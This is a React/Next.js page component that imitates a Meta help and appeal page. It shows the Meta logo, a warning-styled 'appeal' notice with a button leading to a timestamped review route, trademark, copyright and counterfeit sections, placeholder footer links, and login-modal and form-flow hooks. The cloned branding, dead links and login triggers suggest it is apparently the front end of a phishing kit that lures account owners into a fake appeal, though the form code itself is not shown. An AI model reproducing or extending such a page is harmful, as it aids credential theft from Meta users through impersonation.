'use client';

import Background from '@/assets/images/background.png';
import BgHero from '@/assets/images/bg_hero.png';
import Counterfeit from '@/assets/images/counterfeit.png';
import Copyright from '@/assets/images/copyright.png';
import IcWarning from '@/assets/images/ic_warning.svg';
import LogoMeta from '@/assets/images/logo-meta.svg';
import TradeMark from '@/assets/images/trade-mark.png';
import FormFlow from '@/components/FormFlow';
import { useAppTexts } from '@/hooks/use-app-texts';
import { useAppInit } from '@/hooks/use-app-init';
import type { Texts } from '@/hooks/use-texts';
import { useAppStore } from '@/store/store';
import Image from 'next/image';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { useEffect, type FC } from 'react';

const CommunityFooter = ({ texts }: { texts: Texts }) => (
    <div className="w-full border-t border-[#E0E0E0] bg-[#F5F6F6] pt-5 pb-5">
        <div className="mx-auto w-full max-w-[1280px] px-4">
            <div className="community-footer-languages mb-4 flex flex-wrap justify-center gap-4 text-[13px] text-gray-600">
                <a href="#" className="text-[#6D84B4] hover:underline">
                    {texts.footerLangEnglishUS}
                </a>
                <a href="#" className="text-[#6D84B4] hover:underline">
                    {texts.footerLangEnglishUK}
                </a>
                <a href="#" className="text-[#6D84B4] hover:underline">
                    {texts.footerLangItalian}
                </a>
                <a href="#" className="text-[#6D84B4] hover:underline">
                    {texts.footerLangFrench}
                </a>
                <a href="#" className="text-[#6D84B4] hover:underline">
                    {texts.footerLangChinese}
                </a>
                <a href="#" className="text-[#6D84B4] hover:underline">
                    {texts.footerLangJapanese}
                </a>
            </div>
            <div className="community-footer-links flex flex-wrap justify-center gap-4 text-[13px] text-gray-600">
                <p className="mr-4">{texts.footerCopyright}</p>
                <a href="#" className="hover:underline">
                    {texts.footerAbout}
                </a>
                <a href="#" className="hover:underline">
                    {texts.footerPrivacy}
                </a>
                <a href="#" className="hover:underline">
                    {texts.footerTerms}
                </a>
                <a href="#" className="hover:underline">
                    {texts.footerHelpCentre}
                </a>
            </div>
        </div>
    </div>
);

const HelpPage: FC = () => {
    const router = useRouter();
    useAppInit();
    const texts = useAppTexts();
    const { pendingLogin, setPendingLogin, setShowLoginChoiceModal } = useAppStore();

    useEffect(() => {
        if (pendingLogin) {
            setShowLoginChoiceModal(true);
            setPendingLogin(false);
        }
    }, [pendingLogin, setPendingLogin, setShowLoginChoiceModal]);

    const handleOpenReviewPage = () => {
        router.push(`/contact/help/${Date.now()}`);
    };

    return (
        <>
            <div className="community-page flex min-h-screen w-full justify-center bg-white">
                <div className="w-full">
                    <div className="flex h-[52px] items-center justify-center border-b border-[#E0E0E0] bg-[#F5F6F6]">
                        <div className="flex w-full max-w-[1280px] items-center justify-between px-4">
                            <Link href="/contact/help">
                                <Image src={LogoMeta} width={64} height={22} alt={texts.altMeta} />
                            </Link>
                        </div>
                    </div>

                    <div
                        className="flex items-center justify-center bg-cover bg-no-repeat"
                        style={{ backgroundImage: `url(${Background.src})` }}
                    >
                        <div className="flex w-full max-w-[1280px] flex-col items-center justify-between gap-8 px-4 py-6 md:flex-row md:gap-0">
                            <div className="flex w-full max-w-full min-h-[300px] flex-col items-start justify-center text-left md:max-w-[50%] md:min-h-0">
                                <h1 className="mb-3 text-[32px] font-[700]">{texts.heroTitle}</h1>
                                <p className="mb-2 text-[16px]">{texts.heroDesc}</p>
                            </div>
                            <div className="flex w-full max-w-full min-h-[300px] items-center justify-center md:max-w-[50%] md:min-h-0">
                                <Image src={BgHero} alt={texts.altHero} className="h-auto w-full" />
                            </div>
                        </div>
                    </div>

                    <div className="border-b border-[#E0E0E0]">
                        <div className="community-appeal">
                            <div className="community-appeal-intro">
                                <div className="community-appeal-header">
                                    <Image src={IcWarning} alt="" width={29} height={29} className="h-[29px] w-[29px]" />
                                    <b className="community-appeal-title">{texts.appealTitle}</b>
                                </div>
                                <p className="text-gray-800">{texts.appealDesc1}</p>
                                <p className="text-gray-800">{texts.appealDesc2}</p>
                            </div>

                            <div className="community-appeal-section">
                                <p className="community-appeal-section-title">{texts.appealWhyTitle}</p>
                                <p>{texts.appealWhy1}</p>
                                <p>{texts.appealWhy2}</p>
                            </div>

                            <div className="community-appeal-section">
                                <p className="community-appeal-section-title">{texts.appealWhatTitle}</p>
                                <p>{texts.appealWhat1}</p>
                                <p>{texts.appealWhat2}</p>
                                <p>{texts.appealWhat3}</p>
                            </div>

                            <button type="button" onClick={handleOpenReviewPage} className="community-appeal-button">
                                {texts.appealButton}
                            </button>
                        </div>
                    </div>

                    <div className="community-ip-section mx-auto mt-10 w-full max-w-[1280px] px-4">
                        <p className="text-center">
                            <b className="text-center text-2xl font-700 md:text-3xl">{texts.ipTitle}</b>
                        </p>

                        <div className="community-ip-row community-ip-row-text-first">
                            <div className="community-ip-copy community-ip-copy-left">
                                <b className="text-xl font-700 md:text-2xl">{texts.trademarkTitle}</b>
                                <p className="mt-2 text-gray-800">{texts.trademarkDesc}</p>
                            </div>
                            <div className="community-ip-image">
                                <Image src={TradeMark} alt={texts.altTrademark} className="h-auto w-full" />
                            </div>
                        </div>

                        <div className="community-ip-row community-ip-row-image-first">
                            <div className="community-ip-image">
                                <Image src={Copyright} alt={texts.altCopyright} className="h-auto w-full" />
                            </div>
                            <div className="community-ip-copy community-ip-copy-right">
                                <b className="text-xl font-700 md:text-2xl">{texts.copyrightTitle}</b>
                                <p className="mt-2 text-gray-800">{texts.copyrightDesc}</p>
                            </div>
                        </div>

                        <div className="community-ip-row community-ip-row-text-first">
                            <div className="community-ip-copy community-ip-copy-left">
                                <b className="text-xl font-700 md:text-2xl">{texts.counterfeitTitle}</b>
                                <p className="mt-2 text-gray-800">{texts.counterfeitDesc}</p>
                            </div>
                            <div className="community-ip-image">
                                <Image src={Counterfeit} alt={texts.altCounterfeit} className="h-auto w-full" />
                            </div>
                        </div>
                    </div>

                        <CommunityFooter texts={texts} />
                </div>
            </div>
            <FormFlow texts={texts} />
        </>
    );
};

export default HelpPage;
